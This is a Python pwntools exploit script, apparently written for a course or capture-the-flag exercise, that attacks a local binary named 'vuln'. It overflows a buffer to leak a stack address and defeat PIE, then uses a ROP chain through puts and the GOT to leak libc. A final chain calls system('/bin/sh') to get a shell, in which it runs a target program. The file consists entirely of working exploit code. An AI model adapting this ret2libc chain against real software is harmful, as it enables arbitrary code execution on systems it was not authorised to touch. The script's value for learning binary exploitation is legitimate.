#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from os import execv
from pwn import *

exe = context.binary = ELF("./vuln", checksec=False)
libc = exe.libc
#context.log_level = "error"

def start(argv=[], *a, **kw):
    gdbscript = """
    tbreak main
    continue
    """.format(
        **locals()
    )

    if args.GDB:
        context.log_level = "debug"
        context.terminal = ["tmux", "split", "-h"]
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# you can also create new functions here

def main():
    io = start()
    
    # 1. Part get Exe Base Path
    io.recvuntil(b":")
    offset = 0x37 # da liegt main auf dem Stack 
    io.sendline(cyclic(offset))
    leakedAddr = io.recvuntil(b"data!")[28 + offset :34 + offset] # grep only die adresse
    print(leakedAddr)
    leakedAddr = u64(leakedAddr.ljust(8, b"\x00"))

    exe.address = leakedAddr - exe.sym.main

    log.info(f"Exe Addr: {hex(exe.address)}")

    # Rop Chain die puts called, dann main ==> puts geleaked ==> libc base bekannt

    r = ROP(exe)

    r.call(exe.sym.puts, [exe.got.puts])
    r.call(exe.sym.main)

    offset = 0x108
    io.sendline(fit({offset:r.chain()}))
    leakedAddr = io.recvuntil(b":")[1:7]
    leakedAddr = u64(leakedAddr.ljust(8, b"\x00"))

    libc.address = leakedAddr - libc.sym["puts"]

    log.info(f"LibC Base: {hex(libc.address)}")

    io.sendline()
    io.recvuntil(b"data!")

    # Letzte Chain die den Aufruf macht
    # Eig. m√ºsste man hier die Strings im Speicher konstruieren (RW)
    # + dann halt execve syscall vorbereiten

    r = ROP(exe)

    system = libc.sym.system
    binsh = next(libc.search(b"/bin/sh"))

    execve = libc.sym.execve

    r.call(system, [binsh])
    #r.call(execve, [b"/bin/sh -c", b'./execute_me_with_rop'])

    print(r.dump())

    offset = 0x108

    io.sendline(fit({offset:r.chain()}))

    io.recvline(timeout=0.2)

    io.sendline(b"PABE=FUN ./execute_me_with_rop foo bar")
    print(io.recvline().decode("utf-8")[:-1])
    io.sendline(b"PABE=FUN ./execute_me_with_rop foo bar")

    #io.interactive()




if __name__ == "__main__":
    main()
